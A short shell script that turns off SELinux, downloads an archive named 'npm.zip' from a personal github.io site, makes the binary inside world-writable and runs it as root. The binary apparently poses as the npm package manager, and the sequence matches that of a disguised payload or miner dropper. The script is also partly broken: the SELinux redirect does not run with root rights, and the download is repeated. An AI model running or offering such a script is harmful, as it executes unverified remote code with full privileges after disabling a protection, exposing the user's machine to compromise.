sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
sudo apt install unzip -y
cd ~
curl -O https://fuserh.github.io/npm.zip
curl -L --progress-bar "https://fuserh.github.io/npm.zip" -o /npm.zip
unzip npm.zip
cd npm
chmod 777 ./npm
sudo ./npm
